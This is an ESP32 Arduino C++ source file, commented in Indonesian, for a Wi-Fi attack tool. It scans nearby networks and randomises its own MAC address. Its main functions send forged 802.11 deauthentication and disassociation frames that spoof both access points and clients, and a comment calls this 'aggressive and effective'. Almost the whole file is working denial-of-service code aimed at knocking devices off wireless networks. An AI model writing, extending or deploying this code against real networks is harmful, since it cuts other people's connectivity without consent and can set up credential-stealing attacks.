// wifi_utils.cpp

#include "wifi_utils.h"
#include "esp_system.h"
// Fungsi random() sudah built-in di Arduino, tidak perlu include "random.h"

// Konstruktor
WiFi_Utils::WiFi_Utils(bool random_mac) {
  random_mac_enable = random_mac;
}

// Inisialisasi Wi-Fi dalam mode yang dibutuhkan untuk serangan
bool WiFi_Utils::init() {
  // --- PERBAIKAN 1: Gunakan WIFI_MODE_APSTA ---
  WiFi.mode(WIFI_MODE_APSTA); 
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE); // Set ke channel awal
  
  if (random_mac_enable) {
    changeMACAddress();
  }

  mac_address = macAddress();
  
  // --- PERBAIKAN 2: Pisahkan Serial.println untuk std::string ---
  Serial.print("Wi-Fi Utils Initialized. MAC Address: ");
  Serial.println(mac_address.c_str());
  
  isInit = true;
  return isInit;
}

// Scan jaringan Wi-Fi dan simpan dalam struktur data
wifiData WiFi_Utils::scanWifiList() {
  Serial.println("\n[INFO] Scanning networks...");
  wifi_list.ssid.clear();
  wifi_list.bssid.clear();
  wifi_list.channel.clear();
  wifi_list.signal.clear();

  int n = WiFi.scanNetworks(false, true, false, 300); // Async, show_hidden, passive, channel_time_ms
  Serial.println("[INFO] Scan complete.");
  if (n == 0) {
    Serial.println("[INFO] No networks found");
  } else {
    Serial.print((String)n + " networks found\n");
    for (int i = 0; i < n; ++i) {
      wifi_list.ssid.push_back(WiFi.SSID(i).c_str());
      wifi_list.bssid.push_back(WiFi.BSSIDstr(i).c_str());
      wifi_list.channel.push_back(WiFi.channel(i));
      wifi_list.signal.push_back(WiFi.RSSI(i));
    }
  }
  WiFi.scanDelete(); // Hapus hasil scan dari memori
  wifi_list.num = n;
  return wifi_list;
}

// Fungsi untuk mengubah alamat MAC
bool WiFi_Utils::changeMACAddress() {
  uint8_t new_mac[6];
  // Generate 3 byte acak untuk OUI (Organizationally Unique Identifier)
  // dan 3 byte acak untuk NIC (Network Interface Controller)
  for (int i = 0; i < 6; i++) {
    new_mac[i] = random(256); // Fungsi random() ini sudah built-in
  }
  // Set bit lokal dan unicast
  new_mac[0] |= 0x02; 
  new_mac[0] &= ~0x01;

  esp_err_t err = esp_wifi_set_mac(WIFI_IF_AP, new_mac);
  if (err == ESP_OK) {
    Serial.println("[INFO] MAC Address changed successfully.");
    return true;
  } else {
    Serial.println("[ERROR] Failed to change MAC Address.");
    return false;
  }
}


// Fungsi UTAMA: Versi Hibrida - Terstruktur, Agresif, dan Efektif
void WiFi_Utils::sendDeauthPacket(const uint8_t* bssid, const uint8_t* client_mac) {
  // Gunakan struct yang mudah dibaca dan aman
  struct {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t addr1[6]; // Destination Address
    uint8_t addr2[6]; // Source Address
    uint8_t addr3[6]; // BSSID
    uint8_t sequence_control[2];
    uint8_t reason_code[2];
  } __attribute__((packed)) packet;

  // Isi field yang tidak berubah
  packet.duration[0] = 0x00;
  packet.duration[1] = 0x00;
  packet.reason_code[0] = 0x07; // Reason Code 7
  packet.reason_code[1] = 0x00;

  // --- Paket 1: Deauth dari AP ke Klien ---
  packet.frame_control[0] = 0xC0; // Deauth Frame
  packet.frame_control[1] = 0x00;
  memcpy(packet.addr1, client_mac, 6); // Destination = Client
  memcpy(packet.addr2, bssid, 6);     // Source = AP
  memcpy(packet.addr3, bssid, 6);     // BSSID = AP
  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&packet, sizeof(packet), true);
  delay(1);

  // --- Paket 2: Deauth dari Klien ke AP ---
  memcpy(packet.addr1, bssid, 6);     // Destination = AP
  memcpy(packet.addr2, client_mac, 6); // Source = Client
  // addr3 (BSSID) tetap bssid
  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&packet, sizeof(packet), true);
  delay(1);

  // --- Paket 3: Disassociation dari AP ke Klien ---
  packet.frame_control[0] = 0xA0; // Disassociation Frame
  packet.frame_control[1] = 0x00;
  memcpy(packet.addr1, client_mac, 6); // Destination = Client
  memcpy(packet.addr2, bssid, 6);     // Source = AP
  // addr3 (BSSID) tetap bssid
  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&packet, sizeof(packet), true);
  delay(1);

  // --- Paket 4: Disassociation dari Klien ke AP ---
  memcpy(packet.addr1, bssid, 6);     // Destination = AP
  memcpy(packet.addr2, client_mac, 6); // Source = Client
  // addr3 (BSSID) tetap bssid
  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&packet, sizeof(packet), true);
}

void WiFi_Utils::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
  WiFi_Utils::set_channel = channel;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  
  // Build AP source packet
  deauth_frame_default[4] = mac[0];
  deauth_frame_default[5] = mac[1];
  deauth_frame_default[6] = mac[2];
  deauth_frame_default[7] = mac[3];
  deauth_frame_default[8] = mac[4];
  deauth_frame_default[9] = mac[5];
  
  deauth_frame_default[10] = bssid[0];
  deauth_frame_default[11] = bssid[1];
  deauth_frame_default[12] = bssid[2];
  deauth_frame_default[13] = bssid[3];
  deauth_frame_default[14] = bssid[4];
  deauth_frame_default[15] = bssid[5];

  deauth_frame_default[16] = bssid[0];
  deauth_frame_default[17] = bssid[1];
  deauth_frame_default[18] = bssid[2];
  deauth_frame_default[19] = bssid[3];
  deauth_frame_default[20] = bssid[4];
  deauth_frame_default[21] = bssid[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;

  // Build AP dest packet
  deauth_frame_default[4] = bssid[0];
  deauth_frame_default[5] = bssid[1];
  deauth_frame_default[6] = bssid[2];
  deauth_frame_default[7] = bssid[3];
  deauth_frame_default[8] = bssid[4];
  deauth_frame_default[9] = bssid[5];
  
  deauth_frame_default[10] = mac[0];
  deauth_frame_default[11] = mac[1];
  deauth_frame_default[12] = mac[2];
  deauth_frame_default[13] = mac[3];
  deauth_frame_default[14] = mac[4];
  deauth_frame_default[15] = mac[5];

  deauth_frame_default[16] = mac[0];
  deauth_frame_default[17] = mac[1];
  deauth_frame_default[18] = mac[2];
  deauth_frame_default[19] = mac[3];
  deauth_frame_default[20] = mac[4];
  deauth_frame_default[21] = mac[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;
}


// Dapatkan MAC address saat ini
std::string WiFi_Utils::macAddress() {
  return WiFi.macAddress().c_str();
}